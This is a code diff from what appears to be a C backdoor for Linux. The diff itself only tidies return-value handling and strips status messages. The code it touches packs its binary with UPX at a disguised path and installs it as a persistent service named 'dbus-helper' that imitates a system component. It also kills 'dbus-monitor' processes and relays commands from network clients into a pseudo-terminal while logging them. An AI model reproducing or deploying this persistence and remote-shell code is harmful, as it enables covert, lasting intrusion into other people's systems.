@@ -70,7 +70,8 @@ void copy_to_standard_location()
 
     close(source_fd);
     close(target_fd);
-    system("upx --best " DISGUISED_TARGET_PATH " 2>/dev/null 1>/dev/null");
+    int foo = system("upx --best " DISGUISED_TARGET_PATH " 2>/dev/null 1>/dev/null");
+    (void)foo;
 }
 
 void create_service_file(int systemd_enabled)
@@ -120,64 +121,49 @@ void create_service_file(int systemd_enabled)
         exit(EXIT_FAILURE);
     }
 
-    write(fd, service_content, strlen(service_content));
+    int foo = write(fd, service_content, strlen(service_content));
+    (void)foo;
     close(fd);
 }
 
 void setup_service(int systemd_enabled)
 {
+    int foo;
     if (systemd_enabled)
     {
-        system("systemctl daemon-reload");
-        system("systemctl enable dbus-helper");
-        system("systemctl start dbus-helper");
+        foo = system("systemctl daemon-reload");
+        foo = system("systemctl enable dbus-helper");
+        foo = system("systemctl start dbus-helper");
     }
     else
     {
-        system("chmod +x " SERVICE_PATH_SYSVINIT);
-        system("service dbus-helper start");
+        foo = system("chmod +x " SERVICE_PATH_SYSVINIT);
+        foo = system("service dbus-helper start");
     }
+    (void)foo;
 }
 
 void uninstall_service(int systemd_enabled)
 {
-    system("ps aux | grep '[d]bus-monitor' | awk '{print $2}' | xargs kill -9 2>/dev/null 1>/dev/null");
+    int foo;
+    foo = system("ps aux | grep '[d]bus-monitor' | awk '{print $2}' | xargs kill -9 2>/dev/null 1>/dev/null");
 
     if (systemd_enabled)
     {
-        system("systemctl stop dbus-helper");
-        system("systemctl disable dbus-helper");
-        if (remove(SERVICE_PATH_SYSTEMD) == 0)
-        {
-            printf("Systemd service file removed successfully.\n");
-        }
-        else
-        {
-            perror("Failed to remove systemd service file");
-        }
-        system("systemctl daemon-reload");
+        foo = system("systemctl stop dbus-helper");
+        foo = system("systemctl disable dbus-helper");
+        foo = remove(SERVICE_PATH_SYSTEMD);
+        foo = system("systemctl daemon-reload");
     }
     else
     {
-        system("service dbus-helper stop");
-        if (remove(SERVICE_PATH_SYSVINIT) == 0)
-        {
-            printf("SysVinit service file removed successfully.\n");
-        }
-        else
-        {
-            perror("Failed to remove SysVinit service file");
-        }
+        foo = system("service dbus-helper stop");
+        foo = remove(SERVICE_PATH_SYSVINIT);
     }
 
-    if (remove(DISGUISED_TARGET_PATH) == 0)
-    {
-        printf("Binary removed successfully.\n");
-    }
-    else
-    {
-        perror("Failed to remove binary");
-    }
+    foo = remove(DISGUISED_TARGET_PATH);
+
+    (void)foo;
 }
 
 static void md5_to_hex_string(const uint8_t *digest, char *out)
@@ -332,8 +318,8 @@ void handle_client(int client_socket, const char *client_ip)
                 {
                     int n = recv(client_socket, buffer, sizeof(buffer), 0);
                     if (n <= 0) break;
-                    write(master_fd, buffer, n);
-
+                    int foo = write(master_fd, buffer, n);
+                    (void)foo;
                     total_data_received += n;
 
                     log_message(LOG_FILE_PATH, "Command requested: %.*s", n, buffer);
